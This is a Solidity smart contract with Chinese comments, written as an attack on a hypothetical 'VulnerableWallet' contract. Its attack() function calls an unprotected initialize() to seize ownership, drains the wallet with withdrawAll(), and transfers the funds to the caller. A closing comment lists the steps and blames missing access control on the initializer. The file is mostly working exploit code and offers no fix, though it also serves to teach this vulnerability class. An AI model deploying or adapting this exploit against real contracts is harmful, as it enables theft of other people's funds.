// 攻擊合約 - 利用未初始化變數的漏洞

contract Attacker {
    // 目標合約
    VulnerableWallet target;
    
    constructor(address vulnerableWalletAddress) {
        target = VulnerableWallet(vulnerableWalletAddress);
    }
    
    // 攻擊函式
    function attack() external payable {
        // 由於目標合約中的 owner 變數未適當初始化，任何人都可以呼叫 initialize() 函式
        target.initialize(address(this));
        
        // 成功成為 owner 後，可以提取所有資金
        target.withdrawAll();
        
        // 將資金轉給攻擊者
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // 接收資金的函式
    receive() external payable {}
}

/*
攻擊說明：
1. 這次攻擊利用了 VulnerableWallet 合約中 owner 變數沒有在構造函數中正確初始化的漏洞
2. 攻擊者首先部署 Attacker 合約，並在構造函數中指定 VulnerableWallet 合約地址
3. 攻擊者呼叫 attack() 函式，這將執行以下步驟：
   - 呼叫 VulnerableWallet 的 initialize() 函式，將 Attacker 合約設為 owner
   - 利用 owner 權限呼叫 withdrawAll() 函式，提取所有資金
   - 將資金從 Attacker 合約轉移到攻擊者的錢包
4. 這種攻擊成功的關鍵在於合約缺乏對初始化函式的適當訪問控制
*/